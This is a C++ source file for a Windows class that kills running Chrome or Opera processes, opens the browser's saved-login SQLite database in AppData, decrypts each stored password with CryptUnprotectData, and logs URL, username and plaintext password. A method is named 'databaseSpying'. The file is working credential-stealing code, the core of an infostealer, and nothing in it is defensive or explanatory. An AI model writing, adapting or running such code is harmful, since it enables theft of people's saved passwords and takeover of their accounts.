
#include "BrowserPassword.hh"

BrowserPassword::BrowserPassword() : _hKey { HKEY_LOCAL_MACHINE, 
											 HKEY_CURRENT_USER }
{
	_ready = false;
}

BrowserPassword::~BrowserPassword() = default;

void BrowserPassword::setBrowserType(const BrowserType &type)
{
	switch (type)
	{
	case (BrowserType::CHROME):
		initChromeBrowser();
		break;
	case (BrowserType::OPERA):
		initOperaBrowser();
		break;
	}
}

void BrowserPassword::initChromeBrowser()
{
	Log::logSomething("\n\\ Chrome initialization /");
	if (killProcess(C_PROCESS))
		Log::logSomething("[info] Chrome process killed");
	else
		Log::logSomething("[info] Chrome process not found");
	_dbFilePath = C_DBFILE;
	_regKeyPath = C_REGKEY;
	_folder = CSIDL_LOCAL_APPDATA;
	_ready = true;
}

void BrowserPassword::initOperaBrowser()
{
	Log::logSomething("\n\\ Opera initialization /");
	if (killProcess(O_PROCESS))
		Log::logSomething("[info] Opera process killed");
	else
		Log::logSomething("[info] Opera process not found");
	_dbFilePath = O_DBFILE;
	_regKeyPath = O_REGKEY;
	_folder = CSIDL_APPDATA;
	_ready = true;
}

bool BrowserPassword::killProcess(const wchar_t *process)
{
	HANDLE hProcess;
	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	PROCESSENTRY32 ProcessEntry = { 0 };

	ProcessEntry.dwSize = sizeof(ProcessEntry);
	Process32First(hProcessSnapShot, &ProcessEntry);
	while (Process32Next(hProcessSnapShot, &ProcessEntry))
	{
		if (_tcsicmp(ProcessEntry.szExeFile, process) == 0)
		{
			hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
			TerminateProcess(hProcess, 0); // kill browser process before launching analyse
			CloseHandle(hProcess);
			CloseHandle(hProcessSnapShot);
			return (true);
		}

	}
	CloseHandle(hProcessSnapShot);
	return (false);
}

bool BrowserPassword::isBrowserInstalled() 
{ 
	short i = 0;
	HKEY hkey = NULL;

	while (RegOpenKeyExA(_hKey[i], _regKeyPath, 0, KEY_READ, &hkey) != ERROR_SUCCESS && i < _hKey.size())
		i++;
	if (i == _hKey.size())
	{
		Log::logSomething("[KO] Browser is not installed");
		return (false);
	}
	Log::logSomething("[OK] Browser is installed");
	RegCloseKey(hkey); // close the key with handle pointer
	return (true);
}

bool BrowserPassword::findAppdataPath(std::string &appdataPath)
{ 
	char path[MAX_PATH] = { 0 }; // MAX_PATH == 260 characters

	if (SHGetFolderPathA(NULL, _folder, NULL, 0, path) != S_OK)
	{ 
		Log::logSomething("[KO] Error failed to find Appdata folder");
		return (false); 
	}
	Log::logSomething("[OK] Appdata folder found");
	appdataPath.append(path); // add path in our string
	return (true);
}

void BrowserPassword::findPasswordTable(sqlite3 *db)
{
	int i = 0;
	sqlite3_stmt *stmt;

	Log::logSomething("[OK] Database open");
	if (sqlite3_prepare_v2(db, QUERY, -1, &stmt, 0) == SQLITE_OK) 
	{
		Log::logSomething("[OK] Query successfully compiled");
		while (sqlite3_step(stmt) == SQLITE_ROW)
		{
			printPassword(stmt); /* decrypt and display infos */
			i++;
		}
		if (i == 0)
			Log::logSomething("\n[info] Password not found");
	}
	else 
		Log::logSomething("[KO] Error compiling query");
	sqlite3_finalize(stmt); // finalize the compiled query
	sqlite3_close(db); // close database
}

const char *BrowserPassword::uncryptData(BYTE *password, int size)
{ 
	DATA_BLOB in; 
	DATA_BLOB out;

    in.pbData = password;
    in.cbData = size + 1; 
	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))  
	{ 
		out.pbData[out.cbData] = 0; // set zero terminator '\0' 
		return ((const char*)out.pbData);
    } 
	return ("Error not found\n");
}

void BrowserPassword::printPassword(sqlite3_stmt *stmt)
{
	std::string infos = std::string("\nURL:\t" + std::string((const char *)sqlite3_column_text(stmt, 0))) +
						std::string("\nLogin:\t" + std::string((const char *)sqlite3_column_text(stmt, 1))) +
						std::string("\nPassword:\t" + std::string(uncryptData((BYTE *)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2))));

	Log::logSomething(infos);
}

void BrowserPassword::databaseSpying()
{ 
	sqlite3 *db; 
	std::string dbPath; 

	if (!_ready)
		Log::logSomething("[KO] Browser path are not initialized");
	else if (isBrowserInstalled()) // is browser installed on this computer ?
	{
		if (findAppdataPath(dbPath)) // where is it's appdata folder
		{ 
			dbPath += _dbFilePath; // appdata folder path + database file path
			if (sqlite3_open(dbPath.c_str(), &db) == SQLITE_OK)
				findPasswordTable(db); /* find password table on database */
			else
				Log::logSomething("[KO] Error opening database");
		} 
	}
}
